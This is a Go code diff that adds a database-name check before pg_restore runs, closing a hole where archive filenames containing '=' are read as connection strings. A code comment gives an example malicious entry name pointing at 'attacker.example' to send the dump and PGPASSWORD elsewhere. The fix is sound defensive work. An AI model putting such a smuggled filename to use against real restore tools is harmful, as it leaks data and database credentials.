@@ -268,6 +268,14 @@ func (p *Exporter) pgRestore(ctx context.Context, r io.Reader, pathname string) 
 		targetDB = dumpBaseName(pathname)
 	}
 
+	// The filename comes from the archive, and pg_restore's -d takes a full
+	// conninfo string when the value contains "=", so an entry named
+	// "00001-host=attacker.example dbname=x.dump" would send the dump and
+	// PGPASSWORD to whatever host it names.
+	if err := pgconn.ValidDatabaseName(targetDB); err != nil {
+		return fmt.Errorf("restoring %q: %w", pathname, err)
+	}
+
 	args := p.conn.Args()
 	if p.recreate && targetDB != "postgres" {
 		// Drop and recreate the database from the archive metadata.
